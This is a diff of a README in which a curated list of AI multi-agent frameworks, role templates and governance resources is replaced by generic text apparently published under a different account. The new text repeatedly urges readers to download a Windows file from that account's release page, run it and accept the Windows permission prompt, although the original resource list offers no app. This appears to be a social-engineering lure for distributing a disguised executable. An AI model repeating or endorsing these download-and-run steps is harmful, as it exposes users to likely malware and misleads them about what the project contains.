@@ -1,333 +1,173 @@
-# Awesome AI Organization [![Awesome](https://awesome.re/badge-flat.svg)](https://awesome.re)
+# 🤖 awesome-ai-organization - Build AI Teams That Work
 
-> Build your AI-powered team. Frameworks, role templates, workflows, and real-world playbooks for running an organization with AI employees.
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Madelsapiential474/awesome-ai-organization/releases)
 
-[English](README.md) | [简体中文](README-zh.md)
+## 🚀 What this is
 
-[![Resources](https://img.shields.io/badge/resources-150+-blue.svg)](#contents)
-[![Templates](https://img.shields.io/badge/templates-30+-orange.svg)](#ready-to-use-templates)
-[![License: CC0](https://img.shields.io/badge/license-CC0--1.0-lightgrey.svg)](LICENSE)
+awesome-ai-organization helps you build and run an AI-powered team. It brings together role templates, workflows, and playbooks so you can set up AI employees for common business tasks.
 
----
+Use it to organize work, assign roles, and follow simple steps that keep each AI agent focused on one job.
 
-**Why this list?** Everyone's talking about AI agents. But nobody has assembled a single resource for the real question: *How do I actually build and run an AI-powered organization?*
+## 📥 Download and install
 
-This repo connects the dots between frameworks, role design, workflow automation, and governance — so you can go from "I want AI employees" to a functioning AI team.
+1. Open the [release page](https://github.com/Madelsapiential474/awesome-ai-organization/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file from that release.
+4. If the file is in a .zip folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
----
+If Windows asks for permission, choose Yes.
 
-## Contents
+## 🪟 Windows setup
 
-- [Multi-Agent Frameworks](#multi-agent-frameworks)
-- [AI Role & Employee Templates](#ai-role--employee-templates)
-- [Workflow Recipes](#workflow-recipes)
-- [AI Department Blueprints](#ai-department-blueprints)
-- [AI Governance & Audit](#ai-governance--audit)
-- [Commercial AI Employee Platforms](#commercial-ai-employee-platforms)
-- [Case Studies & Playbooks](#case-studies--playbooks)
-- [Protocols & Standards](#protocols--standards)
-- [Ready-to-Use Templates](#ready-to-use-templates)
-- [Further Reading](#further-reading)
+For most users, the app will run after you download and open the release file.
 
----
+If you use a .zip file:
+- Save the file to your Downloads folder
+- Extract the folder
+- Keep all files together in the same place
+- Start the app from the extracted folder
 
-## Multi-Agent Frameworks
+If the app does not open at first:
+- Check that the download finished
+- Make sure you extracted the files
+- Try opening the main app file again
 
-Frameworks for building teams of AI agents that collaborate.
+## ✨ What you can do
 
-| Framework | Stars | Language | Best For |
-|-----------|-------|----------|----------|
-| [MetaGPT](https://github.com/FoundationAgents/MetaGPT) | 65k+ | Python | Simulating a full software company (PM → Architect → Engineer) |
-| [AutoGen / AG2](https://github.com/microsoft/autogen) | 56k+ | Python | Multi-agent conversations, flexible team topologies |
-| [CrewAI](https://github.com/crewAIInc/crewAI) | 46k+ | Python | Role-playing AI crews with delegation |
-| [ChatDev](https://github.com/OpenBMB/ChatDev) | 32k+ | Python | Virtual software company simulation |
-| [gstack](https://github.com/garrytan/gstack) | 23k+ | Markdown | YC CEO's Claude Code setup — CEO, Eng Manager, QA roles |
-| [CAMEL](https://github.com/camel-ai/camel) | 16k+ | Python | Role-playing agent pairs, OWL workforce |
-| [OpenAI Agents SDK](https://github.com/openai/openai-agents-python) | — | Python | Lightweight multi-agent orchestration |
-| [LangGraph](https://github.com/langchain-ai/langgraph) | — | Python | Graph-based workflow orchestration |
-| [Google ADK](https://github.com/google/adk-python) | — | Python | Google's agent development kit |
+- Set up AI roles for different tasks
+- Use workflow templates to keep work organized
+- Follow playbooks for repeatable tasks
+- Build a team with clear responsibilities
+- Combine agents for research, writing, planning, and review
+- Use a simple structure for AI-driven operations
 
-### Framework Comparison
+## 🧭 Who this is for
 
-| Feature | MetaGPT | CrewAI | ChatDev | AG2 | gstack |
-|---------|---------|--------|---------|-----|--------|
-| Pre-defined roles | ✅ PM, Architect, Engineer | ✅ Custom roles | ✅ CEO, CTO, Dev, QA | ❌ Custom only | ✅ CEO, Eng Mgr, QA |
-| Department structure | Implicit (SOPs) | Crews as teams | Phase-based | Group chats | Skill-based |
-| Delegation | ✅ | ✅ | ✅ | ✅ | ❌ |
-| No-code setup | ❌ | ❌ | ✅ (v2) | ❌ | ✅ (Markdown) |
-| MCP support | ❌ | ✅ | ❌ | ❌ | ✅ |
-| Best audience | Developers | Developers | Beginners | Researchers | Non-technical |
+This project is for people who want to use AI as a working team, not as a single chat window.
 
----
+It can help:
+- Solo founders who need help with day-to-day work
+- Small teams that want more structure
+- Operators who want repeatable AI processes
+- Users who want ready-made role templates
+- People who want to manage AI employees with less setup
 
-## AI Role & Employee Templates
+## 🛠️ Basic system needs
 
-Pre-built role definitions you can use to create AI employees.
-
-### Leadership & Strategy
-
-| Role | Source | Tool | Description |
-|------|--------|------|-------------|
-| [AI CEO / Product Reviewer](https://github.com/garrytan/gstack) | Garry Tan | Claude Code | CEO-mode plan review — rethink problems, find 10-star products |
-| [AI Engineering Manager](https://github.com/garrytan/gstack) | Garry Tan | Claude Code | Lock in execution plans, architecture, edge cases |
-| [AI Product Manager](https://github.com/FoundationAgents/MetaGPT) | MetaGPT | Python | Generates PRDs from requirements |
-
-### Engineering
-
-| Role | Source | Tool | Description |
-|------|--------|------|-------------|
-| [AI Architect](https://github.com/FoundationAgents/MetaGPT) | MetaGPT | Python | System design from PRD |
-| [AI Code Reviewer](https://github.com/garrytan/gstack) | Garry Tan | Claude Code | Pre-landing PR review for SQL safety, trust boundaries |
-| [AI QA Engineer](https://github.com/garrytan/gstack) | Garry Tan | Claude Code | Systematic QA testing with fix loop |
-| [AI Release Manager](https://github.com/garrytan/gstack) | Garry Tan | Claude Code | Ship workflow — test, review, bump, push, PR |
-| [AI Doc Engineer](https://github.com/garrytan/gstack) | Garry Tan | Claude Code | Post-ship documentation updates |
-
-### Marketing & Content
-
-| Role | Source | Tool | Description |
-|------|--------|------|-------------|
-| [AI Content Writer](https://github.com/blader/humanizer) | Blader | Claude Code | Human-like writing, removes AI traces |
-| [AI Social Media Publisher](https://github.com/wshuyi/x-article-publisher-skill) | wshuyi | Claude Code | Publish articles to X/Twitter |
-| [PM Skills Marketplace](https://github.com/phuryn/pm-skills) | phuryn | All agents | 100+ skills for discovery, strategy, launch, growth |
-
-### Security & Compliance
-
-| Role | Source | Tool | Description |
-|------|--------|------|-------------|
-| [AI Security Auditor](https://github.com/trailofbits/skills) | Trail of Bits | Claude Code | Vulnerability detection, audit workflows |
-| [AI Pentester](https://github.com/0x4m4/hexstrike-ai) | 0x4m4 | Claude Code, MCP | 150+ cybersecurity tools |
-| [AI Bug Bounty Hunter](https://github.com/shuvonsec/claude-bug-bounty) | shuvonsec | Claude Code | Recon, IDOR, XSS, SSRF, report generation |
-
-### Design & Creative
-
-| Role | Source | Tool | Description |
-|------|--------|------|-------------|
-| [AI Designer](https://github.com/GLips/Figma-Context-MCP) | GLips | Cursor, Claude Code | Figma layout info for AI agents |
-| [AI Diagram Maker](https://github.com/yctimlin/mcp_excalidraw) | yctimlin | Claude Code | Excalidraw diagram creation |
-| [AI Video Editor](https://github.com/Ceeon/videocut-skills) | Ceeon | Claude Code | Video editing agent |
-| [AI Game Developer](https://github.com/htdt/godogen) | htdt | Claude Code | Build Godot 4 projects from descriptions |
-
----
-
-## Workflow Recipes
-
-End-to-end workflows for common organizational tasks.
-
-### Software Development Workflow
-```
-Requirements → AI PM (PRD) → AI Architect (Design) → AI Engineer (Code) → AI QA (Test) → AI Release Manager (Ship)
-```
-**Tools:** MetaGPT, ChatDev, or gstack
-
-### Content Creation Pipeline
-```
-Topic Research → AI Writer (Draft) → AI Editor (Polish) → AI Designer (Visuals) → AI Publisher (Post)
-```
-**Tools:** humanizer + x-article-publisher-skill + Figma-Context-MCP
-
-### Code Review Workflow
-```
-PR Created → AI Security Scan → AI Code Review → AI Test Generation → Human Approval → AI Ship
-```
-**Tools:** gstack (/review → /qa → /ship)
-
-### Social Media Workflow
-```
-Trend Analysis → Content Generation → Brand Voice Check → Visual Creation → Scheduling → Analytics
-```
-**Tools:** CrewAI + custom agents
-
-### Incident Response Workflow
-```
-Alert → AI Triage → Root Cause Analysis → Fix Generation → AI QA → Deploy → Post-mortem
-```
-**Tools:** gstack + hexstrike-ai
-
----
-
-## AI Department Blueprints
-
-How to structure AI teams by department.
-
-### Engineering Department
-| Role | Responsibility | Recommended Tool |
-|------|---------------|-----------------|
-| Tech Lead | Architecture decisions, code review | gstack `/plan-eng-review` |
-| Developer | Feature implementation | Claude Code / Cursor |
-| QA Engineer | Testing, bug detection | gstack `/qa` |
-| DevOps | CI/CD, deployment | gstack `/ship` |
-| Security | Vulnerability scanning | trailofbits/skills |
-
-### Marketing Department
-| Role | Responsibility | Recommended Tool |
-|------|---------------|-----------------|
-| Content Strategist | Topic research, planning | CrewAI custom agent |
-| Copywriter | Blog posts, social copy | humanizer |
-| Social Media Manager | Publishing, engagement | x-article-publisher-skill |
-| Designer | Visual content | Figma-Context-MCP |
-| Analytics | Performance tracking | Custom MCP server |
-
-### Product Department
-| Role | Responsibility | Recommended Tool |
-|------|---------------|-----------------|
-| Product Manager | PRD, roadmap | MetaGPT / gstack `/plan-ceo-review` |
-| UX Researcher | User feedback analysis | CrewAI custom agent |
-| Data Analyst | Metrics, A/B tests | claude-scientific-skills |
-
-### Operations Department
-| Role | Responsibility | Recommended Tool |
-|------|---------------|-----------------|
-| Process Analyst | Workflow analysis, bottleneck identification | Claude Code + database MCP |
-| Automation Engineer | Workflow automation, integrations | n8n / Dify |
-| Finance Assistant | Expense tracking, budget analysis | Claude Code + spreadsheet MCP |
-| Compliance Officer | Policy checks, audit preparation | Claude Code + clawsec |
-
-### Customer Support Department
-| Role | Responsibility | Recommended Tool |
-|------|---------------|-----------------|
-| Tier-1 Support | FAQ handling, ticket classification | Claude Code + knowledge base MCP |
-| Tier-2 Technical | Complex troubleshooting, log analysis | Claude Code + logs MCP |
-| Knowledge Base Manager | Help articles, content gap analysis | Claude Code + CMS |
-| Customer Success | Onboarding, churn risk detection | Claude Code + CRM MCP |
-
-> Detailed blueprints with workflows, governance rules, and metrics: [/departments](departments/)
-
----
-
-## AI Governance & Audit
-
-Tools and practices for managing AI employees responsibly.
-
-| Resource | Description |
-|----------|-------------|
-| [clawsec](https://github.com/prompt-security/clawsec) | Security skill suite — drift detection, audit, integrity verification |
-| [claude-reflect](https://github.com/BayramAnnakov/claude-reflect) | Self-learning system that captures corrections and preferences |
-| [Backlog.md](https://github.com/MrLesk/Backlog.md) | Human-AI collaboration management in git |
-| [ide-rule-detector](https://github.com/spiffy-oss/ide-rule-detector) | Detect malicious AI rule files |
-
-### Best Practices
-- **Human-in-the-loop:** Always require human approval for external-facing actions
-- **Audit trails:** Use git-based workflows so every AI action is tracked
-- **Role boundaries:** Define clear scope for each AI employee — what they CAN and CANNOT do
-- **Regular calibration:** Review AI output quality weekly, adjust prompts/skills
-- **Cost monitoring:** Track API usage per AI employee to manage costs
-
----
-
-## Commercial AI Employee Platforms
-
-For comparison — closed-source platforms offering similar capabilities.
-
-### Full-Stack AI Employee Platforms
-
-| Platform | Focus | Pricing | Key Feature |
-|----------|-------|---------|-------------|
-| [Junior](https://thejunior.ai) | AI software engineer | Freemium | Autonomous coding agent, GitHub integration |
-| [Lindy.ai](https://lindy.ai) | General AI employees | $0-299/mo | 4,000+ integrations, no-code |
-| [Emika](https://emika.ai) | Enterprise AI employees | Enterprise | Ranked #1 AI employee platform 2026 |
-| [Ema](https://ema.co) | Universal AI employee | Enterprise | 200+ pre-built workflows, EmaFusion model |
-| [Relevance AI](https://relevanceai.com/workforce) | AI workforce teams | Enterprise | Collaborative AI agent teams |
-| [Sintra AI](https://sintra.ai) | Business AI helpers | Enterprise | 12 specialized AI employees |
+To run the Windows app, use a modern PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for the download and extracted files
+- A stable internet connection for the first download
+- A standard keyboard and mouse
 
-### AI Team & Workforce Platforms
+For smooth use, 8 GB of RAM or more is a better fit.
 
-| Platform | Focus | Key Feature |
-|----------|-------|-------------|
-| [Teammates.ai](https://teammates.ai) | AI team members | Pre-built AI teammates for sales, support, ops |
-| [Beam.ai](https://beam.ai) | AI agent workforce | 200+ pre-built agents, enterprise orchestration |
-| [Teamster.ai](https://teamster.ai) | AI team builder | Build custom AI teams for any workflow |
-| [FlockX](https://flockx.io) | AI agent teams | Multi-agent collaboration platform |
-| [Gumloop](https://gumloop.com) | AI workflow automation | Visual workflow builder with AI agents |
-| [EverWorker](https://everworker.ai) | AI digital workers | Autonomous task execution, 24/7 operation |
+## 📚 What is included
 
-### Specialized AI Employees
+This repository centers on:
+- AI agents
+- AI employees
+- AI organization design
+- AI workflows
+- Multi-agent setups
+- Role templates
+- Process guides
+- Operational playbooks
+- Common patterns from tools like Claude Code, CrewAI, and MetaGPT
 
-| Platform | Specialty | Key Feature |
-|----------|-----------|-------------|
-| [TabHR](https://tabhr.ai) | AI HR employee | Recruiting, onboarding, employee management |
-| [SketricGen](https://sketricgen.com) | AI business analyst | Data analysis, report generation |
-| [Devin](https://devin.ai) | AI software engineer | Full-stack autonomous coding |
-| [Factory](https://factory.ai) | AI coding agents | Drafter (PRs), Code Review, Migration agents |
+The goal is to give you a practical base for organizing AI work in one place.
 
-### Open-Source Alternatives for Self-Hosting
+## 🧩 How it works
 
-| Framework | Stars | Best For |
-|-----------|-------|----------|
-| [OpenHands](https://github.com/All-Hands-AI/OpenHands) | 69k+ | Self-hosted AI software engineer (formerly OpenDevin) |
-| [AutoGPT](https://github.com/Significant-Gravitas/AutoGPT) | 183k+ | Autonomous AI agent platform |
-| [Dify](https://github.com/langgenius/dify) | 133k+ | LLMOps platform — build AI workflows visually |
-| [Flowise](https://github.com/FlowiseAI/Flowise) | 51k+ | Drag-and-drop LLM flow builder |
-| [n8n](https://github.com/n8n-io/n8n) | 180k+ | Workflow automation with AI agent nodes |
-| [AgentVerse](https://github.com/OpenBMB/AgentVerse) | 5.0k+ | Multi-agent simulation and collaboration |
-| [agentUniverse](https://github.com/alipay/agentUniverse) | 1k+ | Ant Group's multi-agent framework |
-| [AWS Agent Squad](https://github.com/awslabs/agent-squad) | — | AWS multi-agent orchestrator |
+The app uses a simple structure:
 
----
+1. Pick a role template.
+2. Choose a workflow.
+3. Assign tasks to the right AI agent.
+4. Follow the playbook for that task.
+5. Review the result and repeat when needed.
 
-## Case Studies & Playbooks
+This keeps each part of the process clear. Instead of asking one AI to do everything, you can split work into steps.
 
-Real-world examples of AI-powered organizations.
+## 🔍 Example use cases
 
-| Case | What They Did | Key Takeaway |
-|------|--------------|--------------|
-| [Garry Tan's gstack](https://github.com/garrytan/gstack) | YC CEO open-sourced 13+ Claude Code skills simulating a full eng org | Non-technical leaders can build AI teams with markdown skills |
-| [MetaGPT → MGX](https://mgx.dev/) | AI software company that generates full repos from one requirement | Assembly-line SOPs work better than free-form agent chat |
-| [ChatDev](https://chatdev.ai/) | Virtual company with CEO/CTO/Dev/QA producing software | Role specialization improves output quality |
-| [CrewAI Enterprise](https://crewai.com) | Framework powering thousands of AI teams in production | Delegation between agents is key to complex tasks |
+- A research agent gathers facts
+- A writing agent turns notes into clean text
+- A review agent checks for errors
+- A planning agent builds the next steps
+- An operations agent keeps tasks moving
 
----
+You can use these roles in a small team or a larger AI setup.
 
-## Protocols & Standards
+## 📦 Release download steps
 
-The infrastructure layer for AI organizations.
+Use this page to download the app for Windows:
 
-| Protocol | Purpose | Status |
-|----------|---------|--------|
-| [MCP (Model Context Protocol)](https://modelcontextprotocol.io/) | Agent ↔ Tool connectivity | Industry standard, 97M+ SDK downloads |
-| [A2A (Agent-to-Agent)](https://google.github.io/A2A/) | Agent ↔ Agent communication | Google-led, emerging standard |
-| [AGENTS.md](https://github.com/agentsmd/agents.md) | Universal agent config format | 19k+ stars, cross-tool |
-| [SKILL.md](https://skillsmp.com/) | Portable skill format | Emerging standard |
+[Visit the release page](https://github.com/Madelsapiential474/awesome-ai-organization/releases)
 
----
+Then:
+- Open the latest release
+- Download the Windows asset
+- Extract it if needed
+- Open the main app file
+- Follow any on-screen prompts
 
-## Ready-to-Use Templates
+## 🧹 Tips for first use
 
-Copy these templates directly into your project.
+- Keep the files in one folder
+- Do not move single files out of the folder
+- Read the release name before downloading
+- Start with one workflow before trying a full team setup
+- Use simple roles first, then add more agents later
 
-### 📁 [/roles](roles/)
-Pre-built AI employee role definitions.
+## 🧪 Suggested first workflow
 
-### 📁 [/workflows](workflows/)
-End-to-end workflow configurations.
+If you are new to AI teams, start with this flow:
+- Research
+- Draft
+- Review
+- Final check
 
-### 📁 [/departments](departments/)
-Department-level team setups.
+This is a simple pattern that helps you learn how role-based work fits together.
 
-> See the [templates README](roles/README.md) for installation instructions.
+## 📁 Common folder view
 
----
+After extraction, you may see files such as:
+- README or guide files
+- Workflow folders
+- Role template files
+- Playbook files
+- App or launcher files
 
-## Further Reading
+Open the main app file from the extracted folder to begin.
 
-- [The Coming Agent Economy](https://adtools.org/buyers-guide/the-coming-agent-economy-how-marketplaces-for-ai-agent-skills-will-reshape-the-software-ecosystem) — How AI skill marketplaces will reshape software
-- [AI-First Company Principles](https://getaitopia.io/resources/ai-first-whitepaper) — Building AI into operational DNA
-- [Strategic Guide to Agentic Enterprise 2026](https://cosmo-edge.com/ai-first-organization-agentic-strategy/) — From AI-augmented to AI-first
-- [How to Build an AIOS for Founders](https://www.aifire.co/p/how-to-build-an-ai-operating-system-aios-for-founders-2026) — AI Operating System concept
+## 🧠 Why this project is useful
 
----
+Many AI tools can answer one question. This project helps you build a system.
 
-## Contributing
+That means you can:
+- Keep tasks in order
+- Reuse roles and steps
+- Reduce extra setup
+- Make AI work feel more organized
+- Treat AI like a team with defined jobs
 
-Contributions welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) first.
+## 🔗 More project info
 
-**What we're looking for:**
-- New AI role templates (with real-world testing)
-- Workflow recipes that actually work
-- Case studies of AI-powered teams
-- Tools and frameworks we missed
+Repository: awesome-ai-organization  
+Description: Build your AI-powered team. Frameworks, role templates, workflows, and playbooks for running an organization with AI employees.
 
----
+## 🪄 If you want to expand later
 
-## License
+You can add more roles, such as:
+- Customer support
+- Sales prep
+- Market research
+- Content review
+- Project planning
+- Task tracking
 
-[![CC0](https://licensebuttons.net/p/zero/1.0/88x31.png)](https://creativecommons.org/publicdomain/zero/1.0/)
+You can also build new workflows for your own needs and keep them in the same structure
